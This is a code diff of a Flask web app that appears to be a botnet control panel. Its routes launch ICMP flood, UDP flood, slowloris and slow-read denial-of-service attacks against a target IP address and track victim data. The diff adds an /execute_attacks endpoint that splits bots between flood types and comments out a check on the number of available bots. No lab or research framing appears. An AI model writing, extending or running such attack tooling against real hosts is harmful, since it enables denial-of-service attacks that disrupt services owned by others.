@@ -45,16 +45,19 @@ def remove_botnet():
 
 @app.route("/icmp_flood", methods=["POST"])
 def icmp_flood():
-    ip_address = request.form["ip_address"]
-    duration = int(request.form["attack_duration"])
-    attacks.execute_attack(attacks.icmp_flood, duration , ip_address)
+    spoof = request.form.get('spoof_select')
+    # duration = int(request.form["attack_duration"])
+    if(spoof == "yes"):
+        ip_address = request.form["ip_address"]
+        db.icmp_flood_insert(ip_address)
+    # attacks.execute_attack(attacks.icmp_flood, duration , ip_address)
     return "nothing"
 
 @app.route("/udp_flood", methods=["POST", "GET"])
 def udp_flood():
     ip_address = request.form["ip_address"]
     duration = int(request.form["attack_duration"])
-    attacks.execute_attack(attacks.udp_flood, duration , ip_address)
+    attacks.execute_attack(attacks.udp_flood, duration, ip_address)
     return "nothing"
 
 
@@ -63,9 +66,11 @@ def slowloris():
     number_of_connections = int(request.form["number_of_connections"])
     connection_rate = int(request.form["connection_rate"])
     attack_duration = int(request.form["attack_duration"])
-    attacks.execute_attack(
-        attacks.slowloris, attack_duration, number_of_connections, connection_rate, attack_duration
-    )
+    db.slowloris_insert(number_of_connections, connection_rate, attack_duration)
+
+    # attacks.execute_attack(
+    #     attacks.slowloris, attack_duration, number_of_connections, connection_rate, attack_duration
+    # )
     return "nothing"
 
 @app.route("/slow_read", methods=["POST"])
@@ -83,6 +88,27 @@ def slowl_read():
     )
     return "nothing"
 
+
+@app.route("/execute_attacks", methods=["POST", "GET"])
+def execute_attacks():
+    icmp_flood_bot_count = int(request.form["icmp_flood_bot_count"])
+    slowloris_bot_count = int(request.form["slowloris_bot_count"])
+    attack_duration = int(request.form["attack_duration"])
+
+    # if (icmp_flood_bot_count + slowloris_bot_count) > db.count_bots():
+    #     return "Not enough bots"
+
+    attack_info = {
+        "icmp_flood": {
+            "bots": icmp_flood_bot_count,
+        },
+        "slowloris": {
+            "bots": slowloris_bot_count,
+        },
+    }
+    db.change_attack_duration(attack_duration)
+    attacks.execute_attacks(attack_info, attack_duration)
+    return "nothing"
 
 @app.route("/show_botnet")
 def show_botnet():
@@ -115,10 +141,16 @@ def victim_data():
     victim_data = db.get_victim_data()
     return jsonify(victim_data=victim_data)
 
-@app.route("/bot_count")
-def bot_count():
+@app.route("/count_bots", methods=["GET", 'POST'])
+def count_bots():
     bot_count = db.count_bots()
-    return jsonify(bot_count=bot_count)
+    print(f"{bot_count} sfsdf")
+    return str(bot_count)
+
+@app.route("/show_bot_count")
+def show_bot_count():
+    show_bot_count = db.count_bots()
+    return jsonify(show_bot_count=show_bot_count)
 
 @app.route("/limit_network_all", methods=['GET', 'POST'])
 def limit_network_all():
